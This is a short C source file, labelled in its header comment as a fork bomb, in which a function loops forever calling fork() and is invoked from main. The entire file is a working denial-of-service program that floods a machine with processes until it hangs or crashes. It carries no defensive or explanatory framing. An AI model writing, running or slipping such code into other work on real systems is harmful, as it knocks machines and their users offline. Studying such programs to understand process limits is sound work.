/* 
 Sifer Aseph
 fork bomb
 */

#include <unistd.h>

void aSmallBomb() {
    while (1) {
        fork();
    }
    
    return;
}

int main() {
    aSmallBomb();
    
    return 0;
}
